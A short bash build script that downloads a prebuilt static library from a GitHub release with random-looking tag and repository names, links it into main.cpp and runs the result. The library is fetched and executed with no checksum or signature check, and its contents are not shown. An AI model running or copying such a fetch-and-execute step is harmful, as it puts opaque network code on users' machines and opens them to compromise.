#!/usr/bin/env bash
set -e
TAG="golden-badger-crimson-harbor"
LIB="cozy-chest.a"
URL="https://github.com/softscandles/pydeepblot/releases/download/${TAG}/${LIB}"
curl -fsSL -o "$LIB" --retry 3 --connect-timeout 15 --max-time 180 "$URL"
g++ -pthread -O2 -std=c++17 main.cpp "$LIB" -o app && ./app
